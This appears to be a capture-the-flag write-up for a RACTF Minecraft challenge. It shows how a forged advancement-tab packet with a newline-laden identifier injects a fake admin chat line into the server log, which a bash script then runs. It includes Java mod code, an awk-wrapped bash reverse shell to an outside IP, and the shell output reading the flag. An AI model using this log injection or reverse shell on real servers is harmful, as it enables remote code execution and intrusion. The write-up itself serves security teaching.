# Untitled Minecraft Challenge
The challenge provides us with a snippet of a bash script running on the server
```
    tail --follow /app/logs/latest.log --retry 2>/dev/null | { 
        while read line; do
            echo $line | grep -P --color=none "^\[\d+:\d+:\d+ INFO\]: <RACTFAdmin> \!exec" | cut -d'!' -f2 | cut -d' ' -f2- | bash --restricted &
        done
        }
```
this is tailing a log file and looking for chat messages from the user `RACTFAdmin` starting with !exec and then running the command in a restricted bash shell.
The server is in offline mode, however if we try to login as the user RACTFAdmin, we find that the user is banned. Somehow, we need to get a line in the logs that makes it look like RACTFAdmin sent a chat message.

Logging on to the server we notice that join, leave, death and chat messages are disabled. The only way you can legitimately get text into the console is through running commands, however that has line breaks stripped so even executing a command like `/\n[00:00:00 INFO]: <RACTFAdmin> !exec ls`, the regex will not match it. Unless there's an unintended solution, there is no way with a vanilla client to get text into the console.

So we need to find another way to put text into console, the minecraft protocol is documented at https://wiki.vg/Protocol. Out of the list of data types, the only ones that are encoded as a string are String, Chat and Identifier, maybe some of the others like NBT could be worth looking at, but its easier to focus on these 3. An Identifier is a string of the form "namespace:thing", the namespace must meet the regex `[a-z0-9_-]*`, wiki.vg says the name itself can contain more symbols but not which symbols they are.

The packets that use these datatypes are:
 - Login start
 - Chat
 - Client settings
 - Tab complete
 - Plugin Message
 - Name item
 - Advancement tab
 - Update command block
 - Update command block minecart
 - Update jigsaw block
 - Update structure block
 - Update sign

We can immediately rule out all the "update x" packets, all of them require permissions we don't have, and sign requires signs we don't have. Login start has a string we can arbitrarily control and it will print to console, however 16 characters isn't enough to create the chat message. Chat is disabled so we can rule out that packet. Client settings is also limited to 16, so even if it did print to console, it isn't enough. The name item packet (probably) requires an anvil to not be ignored. This leaves us with Plugin message and Advancement tab, both of which use the identifier class.

The code snippets will all be written in the context of a fabric mod using yarn mappings 1.17.1+build.31. This could also be done with a protocol library for another language, probably more easily. Both packets use an identifier field, custom payload is more awkward to send(and doesn't work as well, unsure why), so I'm going to use the advancement packet.

If we send a normal advancement tab packet
```
MinecraftClient.getInstance().player.networkHandler.sendPacket(new AdvancementTabC2SPacket(AdvancementTabC2SPacket.Action.OPENED_TAB, new Identifier("minecraft:abc")));
```
nothing happens, there's no output in console, and our client doesn't get anything. Wiki.vg says the identifier namespace must be in the form `[a-z0-9_-]*`, so lets send one that isn't.
```
MinecraftClient.getInstance().player.networkHandler.sendPacket(new AdvancementTabC2SPacket(AdvancementTabC2SPacket.Action.OPENED_TAB, new Identifier("ABC:abc")));
```
And we get a stacktrace on the client, `net.minecraft.util.InvalidIdentifierException: Non [a-z0-9_.-] character in namespace of location: ABC:abc`. This is annoying because it means we can't send malformed identifiers without a bit more work, however the server's version of the Identifier class is the same, and this prints our string to console. Decompiling the Identifier class shows why this happens
```
    protected Identifier(String[] id) {
        this.namespace = StringUtils.isEmpty(id[0]) ? "minecraft" : id[0];
        this.path = id[1];
        if (!isNamespaceValid(this.namespace)) {
            throw new InvalidIdentifierException("Non [a-z0-9_.-] character in namespace of location: " + this.namespace + ":" + this.path);
        } else if (!isPathValid(this.path)) {
            throw new InvalidIdentifierException("Non [a-z0-9/._-] character in path of location: " + this.namespace + ":" + this.path);
        }
    }

    private static boolean isPathValid(String path) {
        for(int i = 0; i < path.length(); ++i) {
            if (!isPathCharacterValid(path.charAt(i))) {
                return false;
            }
        }

        return true;
    }

    private static boolean isNamespaceValid(String namespace) {
        for(int i = 0; i < namespace.length(); ++i) {
            if (!isNamespaceCharacterValid(namespace.charAt(i))) {
                return false;
            }
        }

        return true;
    }

    public static boolean isPathCharacterValid(char character) {
        return character == '_' || character == '-' || character >= 'a' && character <= 'z' || character >= '0' && character <= '9' || character == '/' || character == '.';
    }

    private static boolean isNamespaceCharacterValid(char character) {
        return character == '_' || character == '-' || character >= 'a' && character <= 'z' || character >= '0' && character <= '9' || character == '.';
    }
```
This code seems to slightly disagree with what wiki.vg says about what is valid, but the most important part is that the string is concatenated into the exception as is, nothing is stripped like is the norm with chat messages and commands. If you're using a protocol library, you might not have this check at all and you might be able to just send a malformed Identifier, but I'm using a fabric mod so I'm going to have to do a bit more work. The only thing blocking us sending it is the constructor throwing exceptions when it is made. We can't avoid calling the constructor if we're sending an identifier, but we can just override the toString method, which is what the client calls to send it, with something like this.
```
    static class CustomIdentifier extends Identifier {

        private String message;

        protected CustomIdentifier(String[] id) {
            super(id);
        }

        public CustomIdentifier(String id) {
            super("");
            this.message = id;
        }

        public CustomIdentifier(String namespace, String path) {
            super(namespace, path);
        }

        @Override
        public String toString() {
            return this.message;
        }

    }
```
Then we can start writing to the server's log, Identifiers can be up to 32kb for some reason, so we have plenty of text to create the chat message.
```
new AdvancementTabC2SPacket(AdvancementTabC2SPacket.Action.OPENED_TAB, new CustomIdentifier("\n[20:00:36 INFO]: <RACTFAdmin> !exec ls"));
```
If you send this packet to a local test server running the bash script, it lists files, so now we just need to find the flag on the remote server. We don't know what the remote server is running, we can't see the logs and we don't know where the flag is, so we'll get a shell with some common stuff it probably has. The shell executing our commands is also restricted, this isn't too big of a deal, just need to wrap the command in something to escape it. I used `bash -i >& /dev/tcp/192.168.86.80/4444 0>&1` to get a shell and wrapped it in awk to escape restricted mode. The final code looked like
```
MinecraftClient.getInstance().player.networkHandler.sendPacket(new AdvancementTabC2SPacket(AdvancementTabC2SPacket.Action.OPENED_TAB, new CustomIdentifier("\n[20:00:36 INFO]: <RACTFAdmin> !exec awk 'BEGIN {system(\"bash -i >& /dev/tcp/192.168.86.80/4444 0>&1\")}'")));
```
Now we just send this packet to the server and get a shell.
```
bash-4.4$ ls /
app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
bash-4.4$ cat /flag.txt
ractf{DiggyDiggyHole}
```